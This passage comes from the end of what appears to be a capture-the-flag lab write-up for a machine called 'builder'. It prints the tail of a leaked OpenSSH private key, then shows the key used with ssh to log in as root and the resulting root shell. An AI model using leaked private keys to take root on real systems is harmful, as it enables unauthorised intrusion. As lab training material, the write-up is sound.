</span></span></span><span class=line><span class=cl><span class=go>EAAAGBALdxvaFMqLl4/9Ai8mvVs+1bN9WwuK3b4L+5/TwsKwKZvD5hgki4L1Kdpu9DChhe
</span></span></span><span class=line><span class=cl><span class=go>XvrNSmWcO4EG1R0SNFPtrf7vAOXSSbFPQ1X/cOeDdPCI7zyv3IBRGHMkV1gBGM9PuNX3A4
</span></span></span><span class=line><span class=cl><span class=go>xsszvXZTZSf8NjUT9sRYOPr2MV/raauhuRZ4YXeZgsFMgLu1SsOHFUt+gjcb6gAvysBQPM
</span></span></span><span class=line><span class=cl><span class=go>tP7NuE9VP7E49sU2jt8JSK3UBj4X2NMLLmCFVd4Bxj8mPG2dhw3REubw0aaBc8IvOWjbpw
</span></span></span><span class=line><span class=cl><span class=go>s70kK586Xa3paoBSXN1D1fLOMmi/STt/rPmpC6+WLz4SFjAJk233k9wcIDA71M8shfMM4f
</span></span></span><span class=line><span class=cl><span class=go>RHtSf+lsmWyc5T/wnbsfYpQ/PKYsEdj7pUF3z4+qJk9OfbhxgeC26dAMUV6C9IJMRl5HF2
</span></span></span><span class=line><span class=cl><span class=go>IFWIEJUzWbCvA4bgK9M2gC5BaNrwz3AgtbHPhWEztYNkjj+LIWRJMTEdU6Oco/30arSr6D
</span></span></span><span class=line><span class=cl><span class=go>MXRKJCFXkHrI9WBr0KhglzSHIYX0TQAAAAMBAAEAAAGAD+8Qvhx3AVk5ux31+Zjf3ouQT3
</span></span></span><span class=line><span class=cl><span class=go>7go7VYEb85eEsL11d8Ktz0YJWjAqWP9PNZQqGb1WQUhLvrzTrHMxW8NtgLx3uCE/ROk1ij
</span></span></span><span class=line><span class=cl><span class=go>rCoaZ/mapDP4t8g8umaQ3Zt3/Lxnp8Ywc2FXzRA6B0Yf0/aZg2KykXQ5m4JVBSHJdJn+9V
</span></span></span><span class=line><span class=cl><span class=go>sNZ2/Nj4KwsWmXdXTaGDn4GXFOtXSXndPhQaG7zPAYhMeOVznv8VRaV5QqXHLwsd8HZdlw
</span></span></span><span class=line><span class=cl><span class=go>R1D9kuGLkzuifxDyRKh2uo0b71qn8/P9Z61UY6iydDSlV6iYzYERDMmWZLIzjDPxrSXU7x
</span></span></span><span class=line><span class=cl><span class=go>6CEj83Hx3gjvDoGwL6htgbfBtLfqdGa4zjPp9L5EJ6cpXLCmA71uwz6StTUJJ179BU0kn6
</span></span></span><span class=line><span class=cl><span class=go>HsMyE5cGulSqrA2haJCmoMnXqt0ze2BWWE6329Oj/8Yl1sY8vlaPSZUaM+2CNeZt+vMrV/
</span></span></span><span class=line><span class=cl><span class=go>ERKwy8y7h06PMEfHJLeHyMSkqNgPAy/7s4jUZyss89eioAfUn69zEgJ/MRX69qI4ExAAAA
</span></span></span><span class=line><span class=cl><span class=go>wQCQb7196/KIWFqy40+Lk03IkSWQ2ztQe6hemSNxTYvfmY5//gfAQSI5m7TJodhpsNQv6p
</span></span></span><span class=line><span class=cl><span class=go>F4AxQsIH/ty42qLcagyh43Hebut+SpW3ErwtOjbahZoiQu6fubhyoK10ZZWEyRSF5oWkBd
</span></span></span><span class=line><span class=cl><span class=go>hA4dVhylwS+u906JlEFIcyfzcvuLxA1Jksobw1xx/4jW9Fl+YGatoIVsLj0HndWZspI/UE
</span></span></span><span class=line><span class=cl><span class=go>g5gC/d+p8HCIIw/y+DNcGjZY7+LyJS30FaEoDWtIcZIDXkcpcAAADBAMYWPakheyHr8ggD
</span></span></span><span class=line><span class=cl><span class=go>Ap3S6C6It9eIeK9GiR8row8DWwF5PeArC/uDYqE7AZ18qxJjl6yKZdgSOxT4TKHyKO76lU
</span></span></span><span class=line><span class=cl><span class=go>1eYkNfDcCr1AE1SEDB9X0MwLqaHz0uZsU3/30UcFVhwe8nrDUOjm/TtSiwQexQOIJGS7hm
</span></span></span><span class=line><span class=cl><span class=go>kf/kItJ6MLqM//+tkgYcOniEtG3oswTQPsTvL3ANSKKbdUKlSFQwTMJfbQeKf/t9FeO4lj
</span></span></span><span class=line><span class=cl><span class=go>evzavyYcyj1XKmOPMi0l0wVdopfrkOuQAAAMEA7ROUfHAI4Ngpx5Kvq7bBP8mjxCk6eraR
</span></span></span><span class=line><span class=cl><span class=go>aplTGWuSRhN8TmYx22P/9QS6wK0fwsuOQSYZQ4LNBi9oS/Tm/6Cby3i/s1BB+CxK0dwf5t
</span></span></span><span class=line><span class=cl><span class=go>QMFbkG/t5z/YUA958Fubc6fuHSBb3D1P8A7HGk4fsxnXd1KqRWC8HMTSDKUP1JhPe2rqVG
</span></span></span><span class=line><span class=cl><span class=go>P3vbriPPT8CI7s2jf21LZ68tBL9VgHsFYw6xgyAI9k1+sW4s+pq6cMor++ICzT++CCMVmP
</span></span></span><span class=line><span class=cl><span class=go>iGFOXbo3+1sSg1AAAADHJvb3RAYnVpbGRlcgECAwQFBg==
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>and save it as <code>id_rsa</code></p><ul><li>These credentials should be valid for <code>jennifer</code> (the only user we have found at the moment). But they are not useful. I cannot log in via <code>SSH</code> with this key.</li><li>However, when I try to log in as <code>root</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>chmod 600 id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ssh -i id_rsa root@10.10.11.10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  System information as of Tue Feb 13 10:09:32 PM UTC 2024
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  System load:              0.080078125
</span></span></span><span class=line><span class=cl><span class=go>  Usage of /:               66.8% of 5.81GB
</span></span></span><span class=line><span class=cl><span class=go>  Memory usage:             38%
</span></span></span><span class=line><span class=cl><span class=go>  Swap usage:               0%
</span></span></span><span class=line><span class=cl><span class=go>  Processes:                219
</span></span></span><span class=line><span class=cl><span class=go>  Users logged in:          0
</span></span></span><span class=line><span class=cl><span class=go>  IPv4 address for docker0: 172.17.0.1
</span></span></span><span class=line><span class=cl><span class=go>  IPv4 address for eth0:    10.10.11.10
</span></span></span><span class=line><span class=cl><span class=go>  IPv6 address for eth0:    dead:beef::250:56ff:feb9:d356
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  =&gt; There is 1 zombie process.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Expanded Security Maintenance for Applications is not enabled.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>0 updates can be applied immediately.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Enable ESM Apps to receive additional future security updates.
</span></span></span><span class=line><span class=cl><span class=go>See https://ubuntu.com/esm or run: sudo pro status
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Tue Feb 13 05:40:40 2024 from 10.10.14.23
</span></span></span><span class=line><span class=cl><span class=go>root@builder:~# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>so we can get both flags, the one from user and root.</p></article></section></div><footer class=footer><section class=container>Â©
2023 -
2024
gunzf0x
Â·
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>